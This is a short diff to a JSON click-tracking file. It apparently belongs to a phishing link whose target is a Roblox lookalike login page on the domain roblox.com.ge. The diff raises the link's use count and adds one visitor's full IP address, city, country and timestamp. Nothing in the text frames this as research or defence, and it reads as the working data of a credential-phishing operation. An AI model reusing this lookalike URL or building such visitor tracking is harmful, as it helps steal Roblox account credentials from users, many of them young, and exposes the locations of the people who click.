@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1198,
+    "useCount": 1199,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9728,6 +9728,14 @@
         "city": "Singapore",
         "flag": "🇸🇬",
         "countryCode": "SG"
+      },
+      {
+        "timestamp": 1777306461864,
+        "ip": "185.164.140.24",
+        "country": "Poland",
+        "city": "Wroclaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
